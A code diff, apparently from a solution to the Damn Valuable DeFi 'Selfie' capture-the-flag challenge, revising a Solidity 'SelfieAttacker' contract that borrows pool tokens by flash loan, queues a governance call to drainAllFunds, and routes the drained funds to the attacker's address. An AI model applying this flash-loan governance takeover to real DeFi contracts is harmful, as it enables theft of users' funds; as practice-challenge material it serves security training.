@@ -13,6 +13,7 @@ contract SelfieAttacker {
     SelfiePool private immutable _pool;
     DamnValuableTokenSnapshot private immutable _token;
     SimpleGovernance private immutable _governance;
+    address private _receiver;
 
     constructor(address poolAddress, address tokenAddress, address governanceAddress) {
         _pool = SelfiePool(poolAddress);
@@ -22,6 +23,8 @@ contract SelfieAttacker {
 
     function attack() public {
         console.log("attack() - sender = ", msg.sender);
+        _receiver = msg.sender;
+
         // get the current available balance in the pool
         uint256 borrowAmount = _token.balanceOf(address(_pool));
 
@@ -40,9 +43,9 @@ contract SelfieAttacker {
             address(_pool),
             abi.encodeWithSignature(
                 "drainAllFunds(address)",
-                msg.sender
+                _receiver
             ),
-            50000000
+            0 // wei amount for gas
         );
         // return the borrowedAmount back to the pool
         _token.transfer(address(_pool), borrowedAmount);
